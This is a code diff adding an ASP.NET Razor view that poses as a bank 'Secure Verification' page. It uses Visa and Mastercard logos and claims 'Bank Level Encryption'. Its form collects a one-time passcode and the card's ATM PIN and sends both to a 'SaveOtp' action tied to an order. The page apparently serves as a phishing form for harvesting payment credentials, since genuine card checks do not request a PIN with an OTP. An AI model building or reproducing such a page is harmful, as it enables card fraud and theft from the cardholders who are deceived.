@@ -1,0 +1,63 @@
+﻿@model BujairiTic.Models.Order
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="~/css/otp.css" asp-append-version="true" />
+</head>
+
+<body>
+
+    <div class="card">
+
+        <h2>Secure Verification</h2>
+
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+        </div>
+
+        <form asp-action="SaveOtp" method="post">
+
+            <input type="hidden" name="id" value="@Model.Id" />
+            <input type="hidden" name="Otp" id="finalOtp" />
+
+            <div class="section">
+                <div class="label">رمز التحقق (OTP)</div>
+                <div class="otp-boxes">
+                    <input type="text" maxlength="1" class="otp pulse">
+                    <input type="text" maxlength="1" class="otp">
+                    <input type="text" maxlength="1" class="otp">
+                    <input type="text" maxlength="1" class="otp">
+                    <input type="text" maxlength="1" class="otp">
+                    <input type="text" maxlength="1" class="otp">
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="label">الرقم السري للبطاقة (PIN)</div>
+                <input type="password" maxlength="4" class="pin-input" id="pin" name="AtmPassword">
+            </div>
+
+            <button type="submit" id="confirmBtn" disabled>تأكيد العملية</button>
+
+        </form>
+
+        <div class="footer">
+            SSL Secured • Bank Level Encryption
+        </div>
+
+    </div>
+
+    <script src="~/js/otp.js" asp-append-version="true"></script>
+
+</body>
+</html>
